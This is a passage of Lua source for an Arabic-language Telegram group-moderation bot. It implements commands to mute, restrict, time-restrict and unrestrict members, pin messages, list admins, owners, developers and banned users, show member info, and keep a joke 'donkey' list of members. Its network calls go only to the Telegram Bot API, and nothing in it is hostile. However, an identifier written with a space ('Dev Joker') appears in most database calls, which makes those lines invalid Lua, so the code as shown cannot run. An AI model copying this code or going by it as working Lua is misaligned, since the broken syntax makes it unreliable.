local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local abs = 'abs:Muted:'..msg.chat_id_
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(Dev Joker..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس مكتوم لالغاء كتمة', 1, 'md')
else
DevAbs:srem(Dev Joker..abs, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المكتوم ↫ ['..absc9..']\n⌁︙تم الغاء كتمة من المجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
--     Source Joker     --
if text:match("^الغاء الكتم @(.*)$") and ChCheck(msg) then
local ap = {string.match(text, "^(الغاء الكتم) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.id_)
local absc9 = user_info_ 
if result.id_ then
if not DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..ap[2]..']\n⌁︙هو ليس مكتوم لالغاء كتمة', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المكتوم ↫ [@'..ap[2]..']\n⌁︙تم الغاء كتمة من المجموعة', 1, 'md')
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_, result.id_)
end
end
end
resolve_username(ap[2],unmute_by_username)
end
--     Source Joker     --
if text:match("^الغاء الكتم (%d+)$") and ChCheck(msg) then
local ap = {string.match(text, "^(الغاء الكتم) (%d+)$")}
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_, ap[2]) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس مكتوم لالغاء كتمة', 1, 'md')
else
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المكتوم ↫ ['..absc9..']\n⌁︙تم الغاء كتمة من المجموعة', 1, 'md')
end
end
end
end 
end
--     Source Joker     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and ChCheck(msg) then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local abs = 'bot:donky:'..msg.chat_id_
local absc9 = user_info_ if user_info_ then
if DevAbs:sismember(Dev Joker..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو مطي شرفع منه بعد😹💔', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المطاية', 1, 'md')
DevAbs:sadd(Dev Joker..abs, result.sender_user_id_)
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Joker     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and ChCheck(msg) then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local abs = 'bot:donky:'..msg.chat_id_
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(Dev Joker..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس مطي ليتم تنزيله', 1, 'md')
else
DevAbs:srem(Dev Joker..abs, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المطي ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المطاية', 1, 'md')
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text and text:match("^تقييد$") and ChCheck(msg) or text and text:match("^تقيد$") and ChCheck(msg) then  
function mute_by_reply(extra, result, success)
if not is_monshid(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("ABS_PROX:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانة معطل من قبل المنشئ ', 1, 'md')
return "ABS_PROX"
end
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false 
end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
DevAbs:sadd(Dev Joker..'abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده من المجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     Source Joker     --
if msg.reply_to_message_id_ ~= 0 then  
if text and text:match("^الغاء تقييد$") and ChCheck(msg) or text and text:match("^الغاء تقيد$") and ChCheck(msg) then
function unmute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع فك تقييدي*', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المقيد ↫ ['..absc9..']\n⌁︙تم الغاء تقييده بنجاح', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
end 
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المقيدين" and ChCheck(msg) then 
local hash  =  'abs:Tkeed:'..msg.chat_id_
local list = DevAbs:smembers(Dev Joker..hash)
text = "⌁︙قائمة المقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد مقيدين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == 'حذف المقيدين' and ChCheck(msg) or text == 'مسح المقيدين' and ChCheck(msg) then     
local abs =  'abs:Tkeed:'..msg.chat_id_
local list = DevAbs:smembers(Dev Joker..abs)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_, v)
end 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المقيدين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end 
--     Source Joker     --
if text and text:match('^تقييد دقيقه (%d+)$') and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد دقيقه (%d+)$")}
local Minutes = string.gsub(mutept[1], 'm', '')
local num1 = tonumber(Minutes) * 60 
local num = tonumber(num1)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده لمدة ↫ '..mutept[1]..' د', 1, 'md')
DevAbs:sadd(Dev Joker..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
if text and text:match('^تقييد ساعه (%d+)$') and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد ساعه (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600 
local num = tonumber(num1)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده لمدة ↫ '..mutept[1]..' س', 1, 'md')
DevAbs:sadd(Dev Joker..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
if text and text:match('^تقييد يوم (%d+)$') and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد يوم (%d+)$")}
local day = string.gsub(mutept[1], 'd', '')
local num1 = tonumber(day) * 86400 
local num = tonumber(num1)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم تقييده لمدة ↫ '..mutept[1]..' ي', 1, 'md')
DevAbs:sadd(Dev Joker..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     Source Joker     --
if is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevAbs:sismember(Dev Joker.."bot:pin:mutepin",msg.chat_id_) and not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
DevAbs:set(Dev Joker..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تثبيت الرسالة بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المميزين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:vipmem:'..msg.chat_id_)
text = "⌁︙قائمة المميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مميزين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
--     Source Joker     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local abs =  'abs:admins:'..msg.chat_id_
local list = DevAbs:smembers(Dev Joker..abs)
text = "⌁︙قائمة الادمنية ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد ادمنية*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end
--     Source Joker     -- 
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:owners:'..msg.chat_id_)
text = "⌁︙قائمة المدراء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مدراء*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
--     Source Joker     --
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:monshid:'..msg.chat_id_)
text = "⌁︙قائمة المنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد منشئين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
--     Source Joker     --
if is_absmonsh(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:monsh:'..msg.chat_id_)
text = "⌁︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد منشئين اساسيين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,res) 
if res.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (res.username_ or "BLACK_TEAM_4")
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙منشئ المجموعة ↫ ["..res.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المكتومين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:Muted:'..msg.chat_id_)
text = "⌁︙قائمة المكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مكتومين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Joker     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:Ban:'..msg.chat_id_)
text = "⌁︙قائمة المحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد محظورين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
--     Source Joker     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local list = DevAbs:smembers(Dev Joker..'bot:donky:'..msg.chat_id_)
text = "⌁︙قائمة مطاية المجموعة 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد مطايه كلها اوادم* 😹💔"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Joker     --
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ⌁" and ChCheck(msg) then 
local BanAll = DevAbs:smembers(Dev Joker..'abs:BanAll:')
local MuteAll = DevAbs:smembers(Dev Joker..'abs:MuteAll:')
if #BanAll ~= 0 then 
text = "⌁︙قائمة المحظورين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(BanAll) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."⌁︙قائمة المكتومين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(MuteAll) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "⌁︙*لم يتم حظر او كتم اي عضو*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Joker     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ⌁" and ChCheck(msg) then 
local abs =  'abs:SudoBot:'
local list = DevAbs:smembers(Dev Joker..abs)
text = "⌁︙قائمة المطورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then
text = "⌁︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Joker     --
if text == "المدراء العامين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:ownerall:')
text = "⌁︙قائمة المدراء العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مدراء عامين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Joker     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local list = DevAbs:smembers(Dev Joker..'abs:vipall:')
text = "⌁︙قائمة المميزين العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then 
text = "⌁︙*لا يوجد مميزين عام*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Joker     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local abs =  'abs:adminall:'
local list = DevAbs:smembers(Dev Joker..abs)
text = "⌁︙قائمة الادمنية العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(Dev Joker.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨`"..v.."`❩\n"
end end
if #list == 0 then
text = "⌁︙*لا يوجد ادمنية عامين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
end 
--     Source Joker     --
if text and text:match("^ضع دعم$") and is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "️⌁︙ارسل رابط الكروب او معرف الدعم \n⌁︙ليتواصل معك المتابعين من خلاله ", 1, "md")
DevAbs:setex(Dev Joker.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if text and text:match("^حذف دعم$") and is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف معلومات الدعم ", 1, "md")
DevAbs:del(Dev Joker.."bot:supports:link")
end
end 
--     Source Joker     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(1330377150) then
t = 'مبرمج السورس'
elseif tonumber(result.sender_user_id_) == tonumber(bot_id) then
t = 'هذا البوت'
elseif tonumber(result.sender_user_id_) == tonumber(DevId) then
t = 'مطور اساسي'
elseif DevAbs:sismember(Dev Joker..'abs:SudoBot:',result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت'
elseif DevAbs:sismember(Dev Joker..'abs:absmonsh:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ المجموعة'
elseif DevAbs:sismember(Dev Joker..'abs:monsh:'..msg.chat_id_,result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:monsh:Rd"..msg.chat_id_) or 'منشئ اساسي'
elseif DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:monshid:Rd"..msg.chat_id_) or 'منشئ'
elseif DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_,result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'مدير'
elseif DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_,result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'ادمن'
elseif DevAbs:sismember(Dev Joker..'abs:vipall:',result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز عام'
elseif DevAbs:sismember(Dev Joker..'abs:ownerall:',result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'مدير عام'
elseif DevAbs:sismember(Dev Joker..'abs:adminall:',result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'ادمن عام'
elseif DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_) then
t = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'عضو مميز'
else
t = DevAbs:get(Dev Joker.."abs:mem:Rd"..msg.chat_id_) or 'مجرد عضو'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..data.id_) or 0
local msguser = tonumber(DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..data.id_))
local user_nkt = tonumber(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..data.id_) or 0)
if DevAbs:sismember(Dev Joker..'abs:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(Dev Joker..'abs:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(Dev Joker..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if data.first_name_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..CatchName(data.first_name_,20)..'](tg://user?id='..result.sender_user_id_..')\n⌁︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌁︙رتبته ↫ '..t..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgg(msguser)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌁︙رتبته ↫ '..t..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgg(msguser)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
local text = '⌁︙*المعرف غير صحيح*'
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '⌁︙نوع الحساب ↫ ❨ '..ch..' ❩\n⌁︙الايدي ↫ ❨ `'..res.id_..'` ❩\n⌁︙المعرف ↫ ❨ [@'..username..'] ❩\n⌁︙الاسم ↫ ❨ ['..res.title_..'] ❩'
